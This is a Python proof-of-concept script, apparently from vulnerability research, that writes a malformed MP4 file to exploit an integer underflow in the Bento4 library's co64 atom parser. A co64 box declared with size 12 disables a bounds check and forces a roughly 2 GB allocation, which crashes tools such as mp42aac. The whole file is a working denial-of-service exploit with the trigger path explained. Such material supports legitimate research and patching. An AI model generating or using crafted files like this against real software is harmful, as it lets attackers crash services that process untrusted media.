#!/usr/bin/env python3
"""
VULN 001 - Integer Underflow in AP4_Co64Atom constructor
CWE-191 (Integer Underflow) -> CWE-770 (Unchecked Giant Heap Allocation)

Vulnerability: Ap4Co64Atom.cpp lines 77-84
  stream.ReadUI32(m_EntryCount);
  if (m_EntryCount > (size-AP4_FULL_ATOM_HEADER_SIZE-4)/8) {
      m_EntryCount = (size-AP4_FULL_ATOM_HEADER_SIZE-4)/8;
  }
  m_Entries = new AP4_UI64[m_EntryCount];

When size=12 (AP4_FULL_ATOM_HEADER_SIZE):
  (12u - 12u - 4u) / 8u  =>  underflow: 0xFFFFFFFC / 8 = 536870911
  Any m_EntryCount <= 536870911 passes the guard (as if disabled).
  With m_EntryCount = 0x10000000 (268435456):
    new AP4_UI64[268435456]  =>  268435456 * 8 = 2 GB allocation  => OOM / bad_alloc

Trigger path:
  mp42aac vuln_001.mp4
  -> AP4_File -> AP4_AtomFactory::CreateAtomFromStream
  -> AP4_Co64Atom::Create(size=12)
  -> AP4_Co64Atom constructor: reads entry_count from stream OUTSIDE declared box boundary
  -> new AP4_UI64[0x10000000]  -- giant allocation
"""

import struct
import os
import sys

OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Co64Atom_h"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.mp4")


def make_box(box_type: bytes, payload: bytes) -> bytes:
    """Build a standard ISO box: size(4BE) + type(4) + payload."""
    assert len(box_type) == 4
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload


def make_full_box(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    """Build a FullBox: size(4BE) + type(4) + version(1) + flags(3) + payload."""
    assert len(box_type) == 4
    size = 12 + len(payload)
    return (
        struct.pack(">I4s", size, box_type)
        + struct.pack(">BBBB", version,
                      (flags >> 16) & 0xFF,
                      (flags >> 8) & 0xFF,
                      flags & 0xFF)
        + payload
    )


def build_mp4() -> bytes:
    # ----------------------------------------------------------------
    # ftyp  (24 bytes)
    # ----------------------------------------------------------------
    ftyp = make_box(b"ftyp",
                    b"mp42"                    # major_brand
                    + struct.pack(">I", 0)     # minor_version
                    + b"isom"                  # compatible_brand[0]
                    + b"mp42")                 # compatible_brand[1]
    # = 8 + 4+4+4+4 = 24 bytes

    # ----------------------------------------------------------------
    # Identity matrix  (used in tkhd and mvhd)
    # ----------------------------------------------------------------
    matrix = struct.pack(">iiiiiiiii",
                         0x00010000, 0,          0,
                         0,          0x00010000,  0,
                         0,          0,           0x40000000)
    # = 36 bytes

    # ----------------------------------------------------------------
    # stbl children
    # ----------------------------------------------------------------

    # stsd with zero sample entries  (16 bytes)
    stsd = make_full_box(b"stsd", 0, 0, struct.pack(">I", 0))

    # stts with zero entries  (16 bytes)
    stts = make_full_box(b"stts", 0, 0, struct.pack(">I", 0))

    # Malformed co64 box: declared size = 12  (= AP4_FULL_ATOM_HEADER_SIZE)
    # Only contains the full-atom header; no room for entry_count or entries.
    # The 4 bytes immediately following in the stream are read by the constructor
    # as m_EntryCount (out-of-declared-bounds read).
    co64_header = struct.pack(">I4sBBBB",
                              12,           # size  <-- the trigger: size == AP4_FULL_ATOM_HEADER_SIZE
                              b"co64",
                              0,            # version
                              0, 0, 0)      # flags
    # = 12 bytes

    # These 4 bytes sit immediately after the co64 box in the stream.
    # The constructor reads them as m_EntryCount.
    # 0x10000000 = 268435456 < 536870911 (underflow bound) => guard is bypassed.
    # new AP4_UI64[268435456]  = 268435456 * 8 bytes = 2 GB  => OOM / bad_alloc
    entry_count_poison = struct.pack(">I", 0x10000000)

    # 4 extra bytes: the stbl container parser will also read these as the
    # start of the next sibling atom (size field = 0x10000000 => harmlessly
    # large, parsing stops before going further).
    dummy_next_type = b"ZZZZ"

    # stbl payload and box  (8 + 16 + 16 + 12 + 4 + 4 = 60 bytes)
    stbl_payload = stsd + stts + co64_header + entry_count_poison + dummy_next_type
    stbl = make_box(b"stbl", stbl_payload)

    # ----------------------------------------------------------------
    # minf
    # ----------------------------------------------------------------

    # smhd  (16 bytes)
    smhd = make_full_box(b"smhd", 0, 0, struct.pack(">HH", 0, 0))

    # dinf/dref with one self-contained url entry  (36 bytes)
    url_entry = make_full_box(b"url ", 0, 1, b"")   # flags=1 -> self-contained
    dref = make_full_box(b"dref", 0, 0, struct.pack(">I", 1) + url_entry)
    dinf = make_box(b"dinf", dref)

    # minf  (8 + 16 + 36 + 60 = 120 bytes)
    minf = make_box(b"minf", smhd + dinf + stbl)

    # ----------------------------------------------------------------
    # mdia
    # ----------------------------------------------------------------

    # mdhd  (32 bytes): creation_time, modification_time, timescale, duration, language, pre_defined
    mdhd = make_full_box(b"mdhd", 0, 0,
                         struct.pack(">IIIIHH", 0, 0, 44100, 0, 0, 0))

    # hdlr  (33 bytes): pre_defined, handler_type, reserved*3, name
    hdlr = make_full_box(b"hdlr", 0, 0,
                         struct.pack(">I", 0)           # pre_defined
                         + b"soun"                      # handler_type
                         + struct.pack(">III", 0, 0, 0) # reserved
                         + b"\x00")                     # name (empty, null-terminated)

    # mdia  (8 + 32 + 33 + 120 = 193 bytes)
    mdia = make_box(b"mdia", mdhd + hdlr + minf)

    # ----------------------------------------------------------------
    # trak
    # ----------------------------------------------------------------

    # tkhd version 0  (92 bytes)
    tkhd = make_full_box(b"tkhd", 0, 3,           # flags=3: track enabled + in movie
                         struct.pack(">IIIII",
                                     0, 0,          # creation_time, modification_time
                                     1,             # track_id
                                     0, 0)          # reserved, duration
                         + struct.pack(">II", 0, 0) # reserved2
                         + struct.pack(">HHHH",
                                       0,           # layer
                                       0,           # alternate_group
                                       0x0100,      # volume (1.0)
                                       0)           # reserved3
                         + matrix                   # 36 bytes
                         + struct.pack(">II", 0, 0))# width, height

    # trak  (8 + 92 + 193 = 293 bytes)
    trak = make_box(b"trak", tkhd + mdia)

    # ----------------------------------------------------------------
    # mvhd  (108 bytes)
    # ----------------------------------------------------------------
    mvhd = make_full_box(b"mvhd", 0, 0,
                         struct.pack(">IIII",
                                     0, 0,          # creation_time, modification_time
                                     1000,          # timescale
                                     0)             # duration
                         + struct.pack(">I", 0x00010000)  # rate (1.0)
                         + struct.pack(">H", 0x0100)      # volume (1.0)
                         + b"\x00" * 10                   # reserved
                         + matrix                          # 36 bytes
                         + b"\x00" * 24                   # pre_defined
                         + struct.pack(">I", 2))           # next_track_id

    # ----------------------------------------------------------------
    # moov  (8 + 108 + 293 = 409 bytes)
    # ----------------------------------------------------------------
    moov = make_box(b"moov", mvhd + trak)

    return ftyp + moov


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    data = build_mp4()
    with open(OUTPUT_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUTPUT_FILE}")
    print(f"[+] co64 declared size = 12 (== AP4_FULL_ATOM_HEADER_SIZE)")
    print(f"[+] Underflow: (12u-12u-4u)/8u = 0xFFFFFFFC/8 = 536870911 (guard disabled)")
    print(f"[+] Poison entry_count = 0x10000000 ({0x10000000}) => allocates {0x10000000*8:,} bytes")


if __name__ == "__main__":
    main()
